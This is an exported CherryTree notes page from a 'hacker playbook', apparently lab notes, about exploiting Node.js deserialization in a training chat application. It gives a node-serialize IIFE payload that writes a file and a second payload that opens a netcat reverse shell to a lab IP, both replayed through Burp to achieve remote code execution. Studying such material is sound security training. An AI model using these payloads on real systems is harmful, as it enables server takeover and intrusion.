<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Deserialization</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="Hacker-playbook--Webapps-attack.html">Webapps-attack</a></p>

<ol>
<li><a href="Hacker-playbook--Webapps-attack--recon-tools.html">recon-tools</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS.html">XSS</a></li>
<ol>
<li><a href="Hacker-playbook--Webapps-attack--XSS--classic_XSS.html">classic XSS</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--HTML_entity_attacks_XSS.html">HTML entity attacks XSS</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Polyglot_Attack.html">Polyglot Attack</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--xsshunter.html">xsshunter</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--DOM_XSS.html">DOM XSS</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Adv_NodeJS_XSS.html">Adv NodeJS XSS</a></li>
<ol>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Adv_NodeJS_XSS--escaped_string_interpolation.html">escaped string interpolation</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Adv_NodeJS_XSS--unescaped_string_interpolation.html">unescaped string interpolation</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Adv_NodeJS_XSS--Escaped_String_Interpolation_into_dynamic_inline_Javascript.html">Escaped String Interpolation into dynamic inline Javascript</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Adv_NodeJS_XSS--Unescaped_buffered_code.html">Unescaped buffered code</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Adv_NodeJS_XSS--Escaped_String_Interpolation_into_escaped_dynamic_inline_Javascript.html">Escaped String Interpolation into escaped dynamic inline Javascript</a></li>
</ol>
</ol>
<li><a href="Hacker-playbook--Webapps-attack--BeeF.html">BeeF</a></li>
<li><a href="Hacker-playbook--Webapps-attack--NoSQL_injection.html">NoSQL injection</a></li>
<ol>
<li><a href="Hacker-playbook--Webapps-attack--NoSQL_injection--classic_login_injection.html">classic login injection</a></li>
<li><a href="Hacker-playbook--Webapps-attack--NoSQL_injection--Advanced_NOSQL_injection.html">Advanced NOSQL injection</a></li>
<ol>
<li><a href="Hacker-playbook--Webapps-attack--NoSQL_injection--Advanced_NOSQL_injection--password_injection.html">password injection</a></li>
<li><a href="Hacker-playbook--Webapps-attack--NoSQL_injection--Advanced_NOSQL_injection--get_users_and_passwords.html">get users and passwords</a></li>
</ol>
</ol>
<li><a href="Hacker-playbook--Webapps-attack--Deserialization.html">Deserialization</a></li>
<li><a href="Hacker-playbook--Webapps-attack--Template_Engine_Attacks.html">Template Engine Attacks</a></li>
<li><a href="Hacker-playbook--Webapps-attack--Tplmap.html">Tplmap</a></li>
<li><a href="Hacker-playbook--Webapps-attack--Template-RCE-upload.html">Template-RCE-upload</a></li>
<li><a href="Hacker-playbook--Webapps-attack--Server_Side_Request_Forgery.html">Server Side Request Forgery</a></li>
<ol>
<li><a href="Hacker-playbook--Webapps-attack--Server_Side_Request_Forgery--chat.html">chat</a></li>
</ol>
<li><a href="Hacker-playbook--Webapps-attack--XML-XXE.html">XML-XXE</a></li>
<ol>
<li><a href="Hacker-playbook--Webapps-attack--XML-XXE--lab.html">lab</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XML-XXE--Advanced_XXE_OOB.html">Advanced XXE OOB</a></li>
</ol></ol></div>
<div class="page"><h1><b><u>Deserialization</u></b></h1><br /><br />In the chat application, the cookie is encoded and use a serialization function on the server side.<br /><br /><br /><img src="images/680-1.png" alt="images/680-1.png" /><br /><br />The source code reveals that the eval() function is used with allow to execute raw javascript.<br /><br /><img src="images/680-2.png" alt="images/680-2.png" /><br /><br /><br />Using the Immediately invoked function express (IFFE ----- say iffy)<br />we are able to remote code execution on the server<br /><a href="https://en.wikipedia.org/wiki/Immediately-invoked_function_expression">https://en.wikipedia.org/wiki/Immediately-invoked_function_expression</a><br /><br /><br /><br />{"thp":"_$$ND_FUNC$$_function (){require('child_process').exec('echo nyws is cool &gt; /opt/web/chatSupportSystems/public/nyws.txt', function(error, stdout, stderr) { console.log(stdout) });}()"}<br /><br /><br /><br /><strong>{"thp":"_$$ND_FUNC$$_function (){require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.4.3 8888 &gt;/tmp/f', function(error, stdout, stderr) { console.log(stdout) });}()"}</strong><br /><br /><br />encode in base64 and replayed using burp leads to RCE and thus revershe shell :<br /><br /><br /><img src="images/680-3.png" alt="images/680-3.png" /><br /><br /><br /><br /><img src="images/680-4.png" alt="images/680-4.png" /><br /><br /></div></div>
</body></html>